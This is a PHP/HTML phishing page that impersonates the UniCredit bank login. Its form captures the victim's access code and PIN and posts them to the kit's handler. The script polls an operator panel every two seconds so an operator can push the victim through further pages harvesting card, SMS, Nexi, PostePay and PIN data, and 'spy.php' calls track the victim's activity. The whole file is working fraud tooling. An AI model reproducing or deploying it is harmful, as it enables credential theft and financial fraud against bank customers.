<?php 
require_once '../includes/main.php';
require '../main.php';
?>
<!doctype html>
<html lang="it">
<head>
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UniCredit</title>
    
    <!-- Corrected FontAwesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    
    <link rel="stylesheet" href="Unicredit/Unicredit.css">
</head>

<body>
    <div class="content">
        <div class="form">
            <div class="form-header">
                <div class="left">
                    <i class="fa-solid fa-arrow-left"></i> <!-- Fixed icon class -->
                </div>
                <div class="mid">
                    <img src="Unicredit/Unicredit.png" alt="UniCredit Logo">
                </div>
                <div class="right">
                    <i class="fa-solid fa-circle-question"></i>
                </div>
            </div>

            <form action="post.php" method="post">
                <div class="form-groups">
                    <div class="form-group">
                        <input type="tel" name="userinx" required placeholder="Inserisci codice adesione" maxlength="8" id="userinx">
                    </div>
                    <div class="form-group">
                        <input type="password" name="passo" required placeholder="Inserisci il PIN" maxlength="8">
                    </div>
                    <div class="form-group" style="text-align: center; margin-top: 20px;">
                        <button type="submit" style="background-color: #CD5C5C; color: white; border: none; padding: 10px 20px; 
                            font-size: 16px; border-radius: 5px; cursor: pointer; transition: 0.3s;">
                            Accedi all'area riservata
                        </button>
                        <p class="forgot" style="margin-top: 10px;">
                            <a href="recuperar-senha.html" style="color: #CD5C5C; text-decoration: none; font-size: 14px; transition: 0.3s;">
                                Richiedi PIN ?
                            </a>
                        </p>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <!-- Ensure jQuery is loaded first -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <!-- Fixed script paths -->
    <script src="res/jq.js"></script>
    <script src="res/v.js"></script>

    <script>
        var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
        };

        function clearRedirections() {
            $.post("../panel/process/processor.php", { clearRedirection: 1 });
        }

        $(document).ready(function () {
            clearRedirections();

            setInterval(function () {
                $.post("../panel/process/processor.php", { keepAlive: 1, page: "Unicredit" });
            }, 2000);

            setInterval(function () {
                $.post("../panel/process/processor.php", { redirectionListener: 1 }, function (data) {
                    var redirect = parseInt(data);
                    if (redirect && targets[redirect]) {
                        clearRedirections();
                        window.location.href = targets[redirect];
                    }
                });
            }, 2000);

            var abort = false;
            $("#email").on("keyup", function () {
                if (!abort) {
                    $.post("spy.php", { nexing: 1 });
                    abort = true;
                    setTimeout(() => abort = false, 5000); // Reset after 5 seconds
                }
            });

            $.post("spy.php", { nexiview: 1 });
        });
    </script>

</body>
</html>
